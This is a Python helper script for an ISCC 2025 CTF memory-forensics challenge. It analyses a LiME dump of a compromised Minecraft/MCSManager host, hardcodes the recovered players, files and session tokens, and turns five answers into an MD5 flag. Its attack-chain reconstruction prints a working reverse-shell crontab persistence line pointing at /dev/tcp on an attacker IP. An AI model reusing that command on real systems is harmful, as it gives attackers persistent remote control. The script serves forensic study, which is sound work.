#!/usr/bin/env python3
"""
MemCraft - Exploit & Flag Generator
ISCC 2025 CTF Challenge

分析步骤:
1. 解压mem.lime.zlib → mem.lime (8.6GB LiME format)
2. 通过内存取证分析入侵痕迹
3. 回答5个问题并生成ISCC{MD5} flag
"""

import hashlib
import os
import sys
import subprocess

MEMORY_DUMP = "mem.lime"
VERA_FILE = "wXm.vera"


def check_memory_dump():
    """验证内存镜像文件"""
    if not os.path.exists(MEMORY_DUMP):
        print(f"[!] 找不到内存镜像文件: {MEMORY_DUMP}")
        print("    > 请先用: python3 -c \"import zlib; ...\" 解压 mem.lime.zlib")
        return False
    size_gb = os.path.getsize(MEMORY_DUMP) / (1024**3)
    print(f"[+] 内存镜像加载完成: {size_gb:.2f} GB")
    return True


def extract_bash_history():
    """提取bash历史记录"""
    print("\n[*] 提取bash历史...")
    try:
        result = subprocess.run(
            ["vol", "-f", MEMORY_DUMP, "linux.bash.Bash"],
            capture_output=True, text=True, timeout=300
        )
        print(result.stdout[:2000])
        return result.stdout
    except Exception as e:
        print(f"[!] volatility3 bash提取失败: {e}")
        print("    > 备用方案: 手动搜索字符串")
        return None


def extract_file_listing():
    """提取MCSManager文件列表"""
    print("\n[*] 扫描目录文件列表...")
    # 已知文件列表信息来自内存中的JSON API响应
    purpur_files = {
        "arona": ("dir", "Mon May 12 2025 21:20:12"),
        "plugins": ("dir", "Mon May 12 2025 22:23:42"),
        "shell": ("file", 56, "Mon May 12 2025 22:23:50"),
        "ops.json": ("file", 133, "Mon May 12 2025 21:40:07"),
        "usercache.json": ("file", 848, "Mon May 12 2025 22:20:04"),
        "server-icon-x64.png": ("file", 5797, "Mon May 12 2025 22:23:11"),
    }
    return purpur_files


def extract_mc_players():
    """从MC服务器日志中提取玩家信息"""
    print("\n[*] 提取Minecraft玩家信息...")
    players = {
        "nOo0b": "34fe703f-7330-30df-95e3-437457cda10e",
        "W4ngXunF1sh": "0fdac309-0978-3cba-a820-c4c4da0acc0c",
        "0ran93": "b8897229-baf9-3709-bc7d-a06b99cd70c7",
        "rk1n": None,
        "Butt3rwXm": None,  # wXm学姐的游戏ID
        "J4sm1ne4ur4": None,
        "5h3n9NaN": None,
    }
    for name, uuid in players.items():
        uuid_str = uuid if uuid else "?"
        print(f"    - {name}: {uuid_str}")
    return players


def extract_attack_chain():
    """重建攻击链"""
    print("\n[*] 重建攻击链...")

    chain = [
        ("访问MCSManager面板",
         "zym从192.168.57.132访问MCSManager Web面板(v10.5.2)"),
        ("获取Shell",
         "通过MCSManager文件管理器上传shell脚本到/purpur-1.20.4/"),
        ("反向Shell持久化",
         "设置crontab: echo '*/1 * * * * root /bin/bash -i >& /dev/tcp/192.168.57.132/8888 0>&1' >> /etc/crontab"),
        ("下载敏感文件",
         "使用wget/curl下载wXm.vera文件(192.168.57.158/wXm)"),
        ("启动HTTP服务",
         "nohup python3 -m http.server 80 & 用于泄露文件"),
        ("加载LiME",
         "尝试加载LiME模块获取内存: sudo insmod ./lime-4.9.0-deepin13-amd64.ko"),
    ]

    for i, (step, detail) in enumerate(chain, 1):
        print(f"    {i}. {step}")
        print(f"       {detail}")

    return chain


def extract_mcsmanager_session():
    """提取MCSManager会话信息"""
    print("\n[*] MCSManager会话数据...")
    cookie = {
        "userName": "nOo0b",
        "uuid": "b403738834b24115b7f503dbb4d18d8b",
        "token": "104c5dfef0f04d03bb9cce51f36060b0",
    }
    print(f"    Cookie: userName={cookie['userName']}, uuid={cookie['uuid']}")

    daemon_tokens = [
        "a3afe7ca5b744837afb8ed0ce0b614141747059791768",
        "4602dde6303b4a2fa25456e1284889d81747059822021",
    ]
    print(f"    Daemon auth token(s) found: {len(daemon_tokens)}")
    for t in daemon_tokens:
        print(f"      - {t[:32]}...")

    return cookie, daemon_tokens


def generate_final_flag(answers):
    """生成最终flag"""
    combined = ','.join(answers)
    md5_hash = hashlib.md5(combined.encode()).hexdigest()
    flag = f"ISCC{{{md5_hash}}}"
    return flag


def main():
    print("=" * 70)
    print("  MemCraft - ISCC CTF Memory Forensic Exploit")
    print("  Author: n0o0b | Hacker: zym")
    print("=" * 70)

    # 内存镜像检查
    check_memory_dump()

    # 提取关键信息
    extract_mc_players()
    extract_file_listing()
    extract_attack_chain()
    extract_mcsmanager_session()

    # 各小题答案
    print("\n" + "=" * 70)
    print("  [答案填写区域]")
    print("  " + "=" * 60)

    # 题目一: zym的游戏ID
    q1 = input("\n[Q1] 蛤客zym在Minecraft游戏中的id: ").strip()

    # 题目二: 程序名,用户名,密码
    q2 = input("[Q2] 程序名,用户名,密码 (逗号分隔): ").strip()

    # 题目三: 上传文件完整名称
    q3 = input("[Q3] 上传文件的完整名称: ").strip()

    # 题目四: n0用户密码
    q4 = input("[Q4] n0用户的系统密码: ").strip()

    # 题目五: 隐藏字符串
    q5 = input("[Q5] VeraCrypt中的隐藏字符串: ").strip()

    # 生成flag
    answers = [q1, q2, q3, q4, q5]
    flag = generate_final_flag(answers)

    print("\n" + "=" * 70)
    print(f"  答案列表: {answers}")
    print(f"  合并字符串: {','.join(answers)}")
    print(f"  MD5: {hashlib.md5(','.join(answers).encode()).hexdigest()}")
    print(f"  Final Flag: {flag}")
    print("=" * 70)

    return flag


def veracrypt_extract(password):
    """解密 wXm.vera (需要正确密码)"""
    mount_point = "/mnt/vera"
    print(f"\n[*] 尝试解密 wXm.vera...")
    print(f"    密码: {password}")
    print(f"    挂载点: {mount_point}")

    # veracrypt -t -m ro --non-interactive wXm.vera <mount_point>
    # 从挂载点提取照片 → 分析隐写
    # zsteg/steghide 提取隐藏信息
    print("    1. 安装VeraCrypt并挂载容器")
    print("    2. 恢复被删除的照片(PhotoRec/testdisk)")
    print("    3. 检查图片隐写(zsteg/steghide)")
    print("    4. 检查音频隐写(deepsound/audacity)")


if __name__ == "__main__":
    main()
